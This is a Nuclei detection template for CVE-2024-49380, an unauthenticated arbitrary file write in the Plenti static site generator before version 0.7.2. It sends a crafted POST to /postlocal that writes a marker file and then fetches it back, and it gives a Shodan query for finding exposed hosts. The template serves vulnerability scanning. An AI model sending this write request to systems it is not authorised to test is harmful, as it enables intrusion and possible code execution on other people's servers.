http:
- matchers:
  - condition: and
    dsl:
    - contains(body_2, "{{randstr}}")
    - contains(header_2, "text/plain")
    - status_code_2 == 200
    type: dsl
  raw:
  - 'POST /postlocal HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    [{"Action": "create","Contents":"{{randstr}}","File": "static/{{filename}}.txt"}]

    '
  - 'GET /{{filename}}.txt?{{wait_for(5)}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-49380
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-49380
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.98463
    epss-score: 0.66632
  description: 'Plenti, a static site generator, has an arbitrary file write vulnerability
    in versions prior to 0.7.2. The `/postLocal` endpoint is vulnerable to an arbitrary
    file write vulnerability when a plenti user serves their website. This issue may
    lead to Remote Code Execution. Version 0.7.2 fixes the vulnerability.

    '
  impact: 'Unauthenticated attackers can write arbitrary files to the server, potentially
    achieving remote code execution.

    '
  metadata:
    max-request: 2
    shodan-query: title:"Plenti"
    verified: true
  name: Plenti < v0.7.2 - OS Command Injection
  reference:
  - https://securitylab.github.com/advisories/GHSL-2024-297_GHSL-2024-298_plenti/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-49380
  remediation: 'Update Plenti to version 0.7.2 or later.

    '
  severity: critical
  tags: cve,cve2024,plenti,rce,injection,intrusive,vuln,vkev
variables:
  filename: '{{rand_base(6)}}'
